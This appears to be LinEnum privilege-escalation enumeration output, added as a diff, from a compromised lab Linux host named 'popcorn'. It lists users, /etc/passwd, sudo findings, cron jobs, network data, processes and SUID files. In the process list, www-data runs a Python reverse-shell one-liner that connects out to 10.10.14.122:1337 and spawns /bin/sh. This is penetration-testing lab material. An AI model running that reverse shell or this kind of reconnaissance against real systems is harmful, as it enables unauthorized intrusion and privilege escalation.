+uid=100(libuuid) gid=101(libuuid) groups=101(libuuid)
+uid=101(syslog) gid=103(syslog) groups=103(syslog)
+uid=102(landscape) gid=105(landscape) groups=105(landscape)
+uid=103(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=1000(george) gid=1000(george) groups=1000(george),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin)
+uid=104(mysql) gid=113(mysql) groups=113(mysql)
+
+
+[00;31m[-] It looks like we have some admin users:[00m
+uid=1000(george) gid=1000(george) groups=1000(george),4(adm),20(dialout),24(cdrom),46(plugdev),109(lpadmin),110(sambashare),111(admin)
+
+
+[00;31m[-] Contents of /etc/passwd:[00m
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+landscape:x:102:105::/var/lib/landscape:/bin/false
+sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
+george:x:1000:1000:George Papagiannopoulos,,,:/home/george:/bin/bash
+mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
+
+
+[00;31m[-] Super user account(s):[00m
+root
+
+
+[00;33m[+] We can sudo without supplying a password![00m
+usage: sudo [-n] -h | -K | -k | -L | -V | -v
+usage: sudo -l[l] [-AnS] [-g groupname|#gid] [-U username] [-u username|#uid]
+            [-g groupname|#gid] [command]
+usage: sudo [-AbEHnPS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
+            username|#uid] [-g groupname|#gid] [VAR=value] [-i|-s] [<command>]
+usage: sudo -e [-AnS] [-C fd] [-g groupname|#gid] [-p prompt] [-u
+            username|#uid] file ...
+
+
+[00;33m[+] Possible sudo pwnage![00m
+file
+
+
+[00;31m[-] Accounts that have recently used sudo:[00m
+/home/george/.sudo_as_admin_successful
+
+
+[00;31m[-] Are permissions on /home directories lax:[00m
+total 12K
+drwxr-xr-x  3 root   root   4.0K Mar 17  2017 .
+drwxr-xr-x 21 root   root   4.0K Feb 26 02:19 ..
+drwxr-xr-x  3 george george 4.0K Oct 26  2020 george
+
+
+[00;31m[-] Root is allowed to login via SSH:[00m
+PermitRootLogin yes
+
+
+[00;33m### ENVIRONMENTAL #######################################[00m
+[00;31m[-] Environment information:[00m
+APACHE_PID_FILE=/var/run/apache2.pid
+APACHE_RUN_USER=www-data
+TERM=xterm
+PATH=/usr/local/bin:/usr/bin:/bin
+PWD=/tmp
+LANG=C
+APACHE_RUN_GROUP=www-data
+SHLVL=2
+_=/usr/bin/env
+
+
+[00;31m[-] Path information:[00m
+/usr/local/bin:/usr/bin:/bin
+drwxr-xr-x 2 root root  4096 Mar 17  2017 /bin
+drwxr-xr-x 2 root root 20480 Oct 26  2020 /usr/bin
+drwxr-xr-x 2 root root  4096 Mar 17  2017 /usr/local/bin
+
+
+[00;31m[-] Available shells:[00m
+# /etc/shells: valid login shells
+/bin/csh
+/bin/sh
+/usr/bin/es
+/usr/bin/ksh
+/bin/ksh
+/usr/bin/rc
+/usr/bin/tcsh
+/bin/tcsh
+/usr/bin/esh
+/bin/dash
+/bin/bash
+/bin/rbash
+/usr/bin/screen
+
+
+[00;31m[-] Current umask value:[00m
+u=rwx,g=rx,o=rx
+0022
+
+
+[00;31m[-] Password and storage information:[00m
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+
+[00;33m### JOBS/TASKS ##########################################[00m
+[00;31m[-] Cron jobs:[00m
+-rw-r--r-- 1 root root  724 Sep 15  2009 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Mar 17  2017 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+-rw-r--r--  1 root root  506 May  3  2011 php5
+
+/etc/cron.daily:
+total 68
+drwxr-xr-x  2 root root  4096 Mar 17  2017 .
+drwxr-xr-x 87 root root  4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root   102 Sep 15  2009 .placeholder
+-rwxr-xr-x  1 root root   633 Nov 18  2010 apache2
+-rwxr-xr-x  1 root root   189 Oct 23  2009 apport
+-rwxr-xr-x  1 root root 16338 Oct 15  2009 apt
+-rwxr-xr-x  1 root root   314 Sep 28  2009 aptitude
+-rwxr-xr-x  1 root root   502 May  9  2009 bsdmainutils
+-rwxr-xr-x  1 root root   256 Sep 20  2009 dpkg
+-rwxr-xr-x  1 root root    89 Aug 20  2009 logrotate
+-rwxr-xr-x  1 root root  1270 Sep  7  2009 man-db
+-rwxr-xr-x  1 root root   665 Apr 29  2009 mlocate
+-rwxr-xr-x  1 root root  2149 Jun 16  2009 popularity-contest
+-rwxr-xr-x  1 root root  3349 Sep 15  2009 standard
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Mar 17  2017 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x  2 root root 4096 Mar 17  2017 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+-rwxr-xr-x  1 root root  129 Sep 15  2009 standard
+
+/etc/cron.weekly:
+total 20
+drwxr-xr-x  2 root root 4096 Oct  1  2020 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root  102 Sep 15  2009 .placeholder
+-rwxr-xr-x  1 root root 1413 Nov 11  2008 cvs
+-rwxr-xr-x  1 root root  830 Sep  7  2009 man-db
+
+
+[00;31m[-] Crontab contents:[00m
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user	command
+17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
+25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+
+
+[00;33m### NETWORKING  ##########################################[00m
+[00;31m[-] Network and IP info:[00m
+eth0      Link encap:Ethernet  HWaddr 00:50:56:b9:18:bd  
+          inet addr:10.10.10.6  Bcast:10.10.10.255  Mask:255.255.255.0
+          inet6 addr: dead:beef::250:56ff:feb9:18bd/64 Scope:Global
+          inet6 addr: fe80::250:56ff:feb9:18bd/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:1512840 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1461900 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:232851588 (232.8 MB)  TX bytes:693650097 (693.6 MB)
+          Interrupt:18 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:1544 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:1544 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:157874 (157.8 KB)  TX bytes:157874 (157.8 KB)
+
+
+[00;31m[-] ARP history:[00m
+fe80::250:56ff:feb9:d772 dev eth0 lladdr 00:50:56:b9:d7:72 router STALE
+10.10.10.2 dev eth0 lladdr 00:50:56:b9:d7:72 DELAY
+
+
+[00;31m[-] Nameserver(s):[00m
+nameserver 8.8.8.8
+nameserver 10.10.10.2
+
+
+[00;31m[-] Default route:[00m
+default via 10.10.10.2 dev eth0  metric 100 
+
+
+[00;31m[-] Listening TCP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
+tcp6       0      0 :::80                   :::*                    LISTEN      -               
+tcp6       0      0 :::22                   :::*                    LISTEN      -               
+
+
+[00;31m[-] Listening UDP:[00m
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+
+
+[00;33m### SERVICES #############################################[00m
+[00;31m[-] Running processes:[00m
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root         1  0.0  0.1   2528  1416 ?        Ss   02:19   0:01 /sbin/init
+root         2  0.0  0.0      0     0 ?        S<   02:19   0:00 [kthreadd]
+root         3  0.0  0.0      0     0 ?        S<   02:19   0:00 [migration/0]
+root         4  0.0  0.0      0     0 ?        S<   02:19   0:00 [ksoftirqd/0]
+root         5  0.0  0.0      0     0 ?        S<   02:19   0:00 [watchdog/0]
+root         6  0.0  0.0      0     0 ?        S<   02:19   0:00 [events/0]
+root         7  0.0  0.0      0     0 ?        S<   02:19   0:00 [cpuset]
+root         8  0.0  0.0      0     0 ?        S<   02:19   0:00 [khelper]
+root         9  0.0  0.0      0     0 ?        S<   02:19   0:00 [netns]
+root        10  0.0  0.0      0     0 ?        S<   02:19   0:00 [async/mgr]
+root        11  0.0  0.0      0     0 ?        S<   02:19   0:00 [kintegrityd/0]
+root        12  0.0  0.0      0     0 ?        S<   02:19   0:00 [kblockd/0]
+root        13  0.0  0.0      0     0 ?        S<   02:19   0:00 [kacpid]
+root        14  0.0  0.0      0     0 ?        S<   02:19   0:00 [kacpi_notify]
+root        15  0.0  0.0      0     0 ?        S<   02:19   0:00 [kacpi_hotplug]
+root        16  0.0  0.0      0     0 ?        S<   02:19   0:00 [ata/0]
+root        17  0.0  0.0      0     0 ?        S<   02:19   0:00 [ata_aux]
+root        18  0.0  0.0      0     0 ?        S<   02:19   0:00 [ksuspend_usbd]
+root        19  0.0  0.0      0     0 ?        S<   02:19   0:00 [khubd]
+root        20  0.0  0.0      0     0 ?        S<   02:19   0:00 [kseriod]
+root        21  0.0  0.0      0     0 ?        S<   02:19   0:00 [kmmcd]
+root        22  0.0  0.0      0     0 ?        S<   02:19   0:00 [bluetooth]
+root        23  0.0  0.0      0     0 ?        S    02:19   0:00 [khungtaskd]
+root        24  0.0  0.0      0     0 ?        S    02:19   0:00 [pdflush]
+root        25  0.0  0.0      0     0 ?        S    02:19   0:00 [pdflush]
+root        26  0.0  0.0      0     0 ?        S<   02:19   0:00 [kswapd0]
+root        27  0.0  0.0      0     0 ?        S<   02:19   0:00 [aio/0]
+root        28  0.0  0.0      0     0 ?        S<   02:19   0:00 [ecryptfs-kthrea]
+root        29  0.0  0.0      0     0 ?        S<   02:19   0:00 [crypto/0]
+root        32  0.0  0.0      0     0 ?        S<   02:19   0:00 [pciehpd]
+root        34  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_0]
+root        35  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_1]
+root        36  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_2]
+root        37  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_3]
+root        38  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_4]
+root        39  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_5]
+root        40  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_6]
+root        41  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_7]
+root        42  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_8]
+root        43  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_9]
+root        44  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_10]
+root        45  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_11]
+root        46  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_12]
+root        47  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_13]
+root        48  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_14]
+root        49  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_15]
+root        50  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_16]
+root        51  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_17]
+root        52  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_18]
+root        53  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_19]
+root        54  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_20]
+root        55  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_21]
+root        56  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_22]
+root        57  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_23]
+root        58  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_24]
+root        59  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_25]
+root        60  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_26]
+root        61  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_27]
+root        62  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_28]
+root        63  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_29]
+root        64  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_30]
+root        66  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_31]
+root        68  0.0  0.0      0     0 ?        S<   02:19   0:00 [kstriped]
+root        70  0.0  0.0      0     0 ?        S<   02:19   0:00 [kmpathd/0]
+root        72  0.0  0.0      0     0 ?        S<   02:19   0:00 [kmpath_handlerd]
+root        74  0.0  0.0      0     0 ?        S<   02:19   0:00 [ksnapd]
+root        76  0.0  0.0      0     0 ?        S<   02:19   0:00 [kondemand/0]
+root        78  0.0  0.0      0     0 ?        S<   02:19   0:00 [kconservative/0]
+root        80  0.0  0.0      0     0 ?        S<   02:19   0:00 [krfcommd]
+root       198  0.0  0.0      0     0 ?        S<   02:19   0:00 [mpt_poll_0]
+root       315  0.0  0.0      0     0 ?        S<   02:19   0:00 [mpt/0]
+root       417  0.0  0.0      0     0 ?        S<   02:19   0:00 [scsi_eh_32]
+root       431  0.0  0.0      0     0 ?        S<   02:19   0:00 [kdmflush]
+root       435  0.0  0.0      0     0 ?        S<   02:19   0:00 [kdmflush]
+root       476  0.0  0.0      0     0 ?        S<   02:19   0:00 [kjournald2]
+root       526  0.0  0.0   2284   892 ?        S    02:19   0:00 upstart-udev-bridge --daemon
+root       531  0.0  0.1   2812  1268 ?        S<s  02:19   0:00 udevd --daemon
+root       704  0.0  0.1   2764  1112 ?        S<   02:19   0:00 udevd --daemon
+root       726  0.0  0.0      0     0 ?        S<   02:19   0:00 [kpsmoused]
+root       737  0.0  0.1   2764  1112 ?        S<   02:19   0:00 udevd --daemon
+root       919  0.0  0.0   1852   540 ?        Ss   02:19   0:00 dd bs=1 if=/proc/kmsg of=/var/run/rsyslog/kmsg
+syslog     923  0.0  0.1  33568  1576 ?        Sl   02:19   0:00 rsyslogd -c4
+root      1035  0.0  0.0   1704   544 tty4     Ss+  02:19   0:00 /sbin/getty -8 38400 tty4
+root      1041  0.0  0.0   1704   544 tty5     Ss+  02:19   0:00 /sbin/getty -8 38400 tty5
+root      1044  0.0  0.0   1704   544 tty2     Ss+  02:19   0:00 /sbin/getty -8 38400 tty2
+root      1045  0.0  0.0   1704   544 tty3     Ss+  02:19   0:00 /sbin/getty -8 38400 tty3
+root      1047  0.0  0.0   1704   540 tty6     Ss+  02:19   0:00 /sbin/getty -8 38400 tty6
+daemon    1048  0.0  0.0   1964   420 ?        Ss   02:19   0:00 atd
+root      1050  0.0  0.0   2092   876 ?        Ss   02:19   0:00 cron
+root      1113  0.0  0.1   5436  1072 ?        Ss   02:19   0:00 /usr/sbin/sshd
+root      1203  0.0  0.0   1752   536 ?        S    02:19   0:00 /bin/sh /usr/bin/mysqld_safe
+root      1235  0.0  0.0      0     0 ?        S<   02:19   0:00 [vmmemctl]
+mysql     1441  0.0  1.8 147420 18648 ?        Sl   02:19   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
+root      1443  0.0  0.0   1668   544 ?        S    02:19   0:00 logger -t mysqld -p daemon.error
+root      1592  0.0  0.6  33200  6864 ?        Ss   02:19   0:00 /usr/sbin/apache2 -k start
+root      1600  0.0  0.3  17008  3812 ?        Rl   02:19   0:02 /usr/sbin/vmtoolsd
+root      1630  0.0  0.0   1704   544 tty1     Ss+  02:19   0:00 /sbin/getty -8 38400 tty1
+root      1648  0.0  0.7  13752  7684 ?        S    02:19   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+www-data  1754  0.1  0.6  33940  6896 ?        S    02:25   0:03 /usr/sbin/apache2 -k start
+www-data  1837  0.0  0.7  33932  7544 ?        S    02:29   0:02 /usr/sbin/apache2 -k start
+www-data  1854  0.0  0.6  34060  7064 ?        S    02:31   0:01 /usr/sbin/apache2 -k start
+www-data  1869  0.0  0.6  33896  6432 ?        S    02:32   0:02 /usr/sbin/apache2 -k start
+www-data  1881  0.0  0.7  34092  7512 ?        S    02:34   0:01 /usr/sbin/apache2 -k start
+www-data  1888  0.0  0.6  34060  7132 ?        S    02:35   0:01 /usr/sbin/apache2 -k start
+www-data  1890  0.0  0.6  34060  7172 ?        S    02:35   0:01 /usr/sbin/apache2 -k start
+www-data  1891  0.0  0.6  33896  6432 ?        S    02:35   0:00 /usr/sbin/apache2 -k start
+www-data  1893  0.0  0.6  33896  6688 ?        S    02:36   0:00 /usr/sbin/apache2 -k start
+www-data  1911  0.0  0.6  33896  6752 ?        S    02:38   0:00 /usr/sbin/apache2 -k start
+www-data  1948  0.0  0.0   1752   488 ?        S    02:59   0:00 sh -c python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.122",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
+www-data  1949  0.0  0.3   7416  3832 ?        S    02:59   0:00 python -c import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.122",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
+www-data  1950  0.0  0.0   1752   504 pts/0    Ss   02:59   0:00 /bin/sh
+www-data  1952  0.0  0.2   5400  3040 pts/0    S+   02:59   0:00 python -c import pty;pty.spawn("/bin/bash")
+www-data  1953  0.0  0.1   3532  1916 pts/1    Ss   02:59   0:00 /bin/bash
+www-data  2863  0.0  0.1   3344  1724 pts/1    S+   03:21   0:00 /bin/bash ./LinEnum.sh -r popcorn
+www-data  2865  0.0  0.1   3900  1600 pts/1    S+   03:21   0:00 /bin/bash ./LinEnum.sh -r popcorn
+www-data  2867  0.0  0.0   1688   456 pts/1    S+   03:21   0:00 tee -a popcorn-26-02-22
+www-data  3095  0.0  0.1   3876  1304 pts/1    S+   03:21   0:00 /bin/bash ./LinEnum.sh -r popcorn
+www-data  3096  0.0  0.0   2364   924 pts/1    R+   03:21   0:00 ps aux
+
+
+[00;31m[-] Process binaries and associated permissions (from above list):[00m
+-rwxr-xr-x 1 root root  875596 Sep 14  2009 /bin/bash
+lrwxrwxrwx 1 root root       4 Mar 17  2017 /bin/sh -> dash
+-rwxr-xr-x 1 root root   18360 Oct 23  2009 /sbin/getty
+-rwxr-xr-x 1 root root  169676 Oct 15  2009 /sbin/init
+lrwxrwxrwx 1 root root      37 Oct 26  2020 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin32/appLoader
+lrwxrwxrwx 1 root root      34 Mar 17  2017 /usr/sbin/apache2 -> ../lib/apache2/mpm-prefork/apache2
+-rwxr-xr-x 1 root root 8376232 Nov 10  2010 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root  414304 Oct 22  2009 /usr/sbin/sshd
+lrwxrwxrwx 1 root root      37 Oct 26  2020 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin32/vmtoolsd
+
+
+[00;31m[-] /etc/init.d/ binary permissions:[00m
+total 184
+drwxr-xr-x  2 root root  4096 Oct 26  2020 .
+drwxr-xr-x 87 root root  4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root    24 Mar 17  2017 .depend.boot
+-rw-r--r--  1 root root    24 Mar 17  2017 .depend.start
+-rw-r--r--  1 root root    10 Mar 17  2017 .depend.stop
+-rw-r--r--  1 root root     0 Mar 17  2017 .legacy-bootordering
+-rw-r--r--  1 root root 12288 Oct 14  2009 .umountroot.swp
+-rw-r--r--  1 root root  1510 Sep  7  2009 README
+-rwxr-xr-x  1 root root  6461 Nov 18  2010 apache2
+-rwxr-xr-x  1 root root  3314 Oct 17  2009 apparmor
+lrwxrwxrwx  1 root root    21 Mar 17  2017 apport -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 atd -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  2341 Sep  7  2009 bootlogd
+-rwxr-xr-x  1 root root  1670 Jul  6  2009 console-setup
+lrwxrwxrwx  1 root root    21 Mar 17  2017 cron -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 dmesg -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  1235 Feb 20  2009 dns-clean
+-rwxr-xr-x  1 root root  1105 Oct 24  2009 grub-common
+-rwxr-xr-x  1 root root  1329 Sep  7  2009 halt
+lrwxrwxrwx  1 root root    21 Mar 17  2017 hwclock -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 hwclock-save -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  1404 Jul  6  2009 keyboard-setup
+-rwxr-xr-x  1 root root  1293 Sep  7  2009 killprocs
+lrwxrwxrwx  1 root root    21 Mar 17  2017 module-init-tools -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  5609 Nov 10  2010 mysql
+-rwxr-xr-x  1 root root  2070 Sep 15  2009 networking
+-rwxr-xr-x  1 root root   882 Sep  7  2009 ondemand
+-rwxr-xr-x  1 root root   420 Feb 20  2009 pppd-dns
+lrwxrwxrwx  1 root root    21 Mar 17  2017 procps -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  8863 Sep  7  2009 rc
+-rwxr-xr-x  1 root root   801 Sep  7  2009 rc.local
+-rwxr-xr-x  1 root root   117 Sep  7  2009 rcS
+-rwxr-xr-x  1 root root   639 Sep  7  2009 reboot
+-rwxr-xr-x  1 root root  4310 Jun 25  2009 rsync
+lrwxrwxrwx  1 root root    21 Mar 17  2017 rsyslog -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 rsyslog-kmsg -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  1055 Jul  6  2009 screen-cleanup
+-rwxr-xr-x  1 root root  2283 Sep  7  2009 sendsigs
+-rwxr-xr-x  1 root root   590 Sep  7  2009 single
+-rw-r--r--  1 root root  4271 Sep  7  2009 skeleton
+-rwxr-xr-x  1 root root  3878 Oct 22  2009 ssh
+-rwxr-xr-x  1 root root   519 Sep  7  2009 stop-bootlogd
+-rwxr-xr-x  1 root root  1095 Sep  7  2009 stop-bootlogd-single
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udev -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udev-finish -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udevmonitor -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 udevtrigger -> /lib/init/upstart-job
+lrwxrwxrwx  1 root root    21 Mar 17  2017 ufw -> /lib/init/upstart-job
+-rwxr-xr-x  1 root root  2746 Oct 14  2009 umountfs
+-rwxr-xr-x  1 root root  2075 Oct 14  2009 umountnfs.sh
+-rwxr-xr-x  1 root root  1683 Oct 14  2009 umountroot
+-rwxr-xr-x  1 root root  1997 Sep  7  2009 urandom
+-rwxr-xr-x  1 root root  2327 Sep 20  2009 wpa-ifupdown
+-rwxr-xr-x  1 root root  1777 Dec  5  2008 x11-common
+
+
+[00;31m[-] /etc/init/ config file permissions:[00m
+total 144
+drwxr-xr-x  2 root root 4096 Oct 26  2020 .
+drwxr-xr-x 87 root root 4096 Feb 26 02:19 ..
+-rw-r--r--  1 root root 1271 Oct 23  2009 apport.conf
+-rw-r--r--  1 root root  261 Sep 15  2009 atd.conf
+-rw-r--r--  1 root root  356 Oct 15  2009 control-alt-delete.conf
+-rw-r--r--  1 root root  297 Sep 15  2009 cron.conf
+-rw-r--r--  1 root root  273 Oct 15  2009 dmesg.conf
+-rw-r--r--  1 root root  312 Sep 10  2009 hostname.conf
+-rw-r--r--  1 root root  444 Oct 23  2009 hwclock-save.conf
+-rw-r--r--  1 root root  557 Oct 23  2009 hwclock.conf
+-rw-r--r--  1 root root  367 Sep 16  2009 module-init-tools.conf
+-rw-r--r--  1 root root  335 Oct 26  2009 mountall-net.conf
+-rw-r--r--  1 root root  261 Oct 26  2009 mountall-reboot.conf
+-rw-r--r--  1 root root 1073 Oct 26  2009 mountall-shell.conf
+-rw-r--r--  1 root root  793 Oct 26  2009 mountall.conf
+-rw-r--r--  1 root root  493 Sep 14  2009 network-interface.conf
+-rw-r--r--  1 root root  290 Sep 15  2009 networking.conf
+-rw-r--r--  1 root root  293 Sep 16  2009 procps.conf
+-rw-r--r--  1 root root 1453 Oct 15  2009 rc-sysinit.conf
+-rw-r--r--  1 root root  354 Oct 15  2009 rc.conf
+-rw-r--r--  1 root root  822 Oct 15  2009 rcS.conf
+-rw-r--r--  1 root root  589 Oct 15  2009 rsyslog-kmsg.conf
+-rw-r--r--  1 root root  280 Oct 15  2009 rsyslog.conf
+-rw-r--r--  1 root root  228 Oct 15  2009 tty1.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty2.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty3.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty4.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty5.conf
+-rw-r--r--  1 root root  213 Oct 15  2009 tty6.conf
+-rw-r--r--  1 root root  769 Sep 22  2009 udev-finish.conf
+-rw-r--r--  1 root root  316 Sep 22  2009 udev.conf
+-rw-r--r--  1 root root  356 Sep 22  2009 udevmonitor.conf
+-rw-r--r--  1 root root  318 Sep 22  2009 udevtrigger.conf
+-rw-r--r--  1 root root  344 Sep 24  2009 ufw.conf
+-rw-r--r--  1 root root  313 Oct 15  2009 upstart-udev-bridge.conf
+-r--r--r--  1 root root  901 Oct 26  2020 vmware-tools.conf
+
+
+[00;33m### SOFTWARE #############################################[00m
+[00;31m[-] Sudo version:[00m
+Sudo version 1.7.0
+
+
+[00;31m[-] MYSQL version:[00m
+mysql  Ver 14.14 Distrib 5.1.37, for debian-linux-gnu (i486) using  EditLine wrapper
+
+
+[00;31m[-] Apache user configuration:[00m
+APACHE_RUN_USER=www-data
+APACHE_RUN_GROUP=www-data
+
+
+[00;33m### INTERESTING FILES ####################################[00m
+[00;31m[-] Useful file locations:[00m
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/usr/bin/gcc
+
+
+[00;31m[-] Installed compilers:[00m
+ii  g++                                 4:4.4.1-1ubuntu2                  The GNU C++ compiler
+ii  g++-4.4                             4.4.1-4ubuntu9                    The GNU C++ compiler
+ii  gcc                                 4:4.4.1-1ubuntu2                  The GNU C compiler
+ii  gcc-4.4                             4.4.1-4ubuntu9                    The GNU C compiler
+
+
+[00;31m[-] Can we read/write sensitive files:[00m
+-rw-r--r-- 1 root root 1031 Mar 17  2017 /etc/passwd
+-rw-r--r-- 1 root root 691 Mar 17  2017 /etc/group
+-rw-r--r-- 1 root root 497 Mar 17  2017 /etc/profile
+-rw-r----- 1 root shadow 838 Mar 17  2017 /etc/shadow
+
+
+[00;31m[-] SUID files:[00m
+-rwsr-xr-x 1 root root 30492 May 12  2009 /bin/ping6
+-rwsr-xr-x 1 root root 34696 May 12  2009 /bin/ping
+-rwsr-xr-x 1 root root 47096 Oct 23  2009 /bin/umount
+-rwsr-xr-x 1 root root 72188 Oct 23  2009 /bin/mount
+-rwsr-xr-x 1 root root 22064 Mar  5  2009 /bin/fusermount
